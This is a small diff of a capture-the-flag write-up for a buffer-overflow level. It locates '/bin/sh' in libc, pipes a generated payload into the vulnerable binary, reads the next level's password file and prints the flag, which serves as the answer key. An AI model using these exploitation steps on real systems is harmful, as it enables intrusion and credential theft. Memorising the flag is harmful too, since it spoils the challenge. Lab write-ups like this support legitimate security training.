@@ -14,7 +14,7 @@
     strings -t x -a /lib32/libc.so.6 | grep "/bin/sh"
 ## Answer
     python craft_payload.py (This will generate our payload to exploite the buffer overflow)
-    cat payload - | ./level01
+    cat /tmp/payload - | ./level01
     cat /home/users/level02/.pass
 ## Flag
     PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
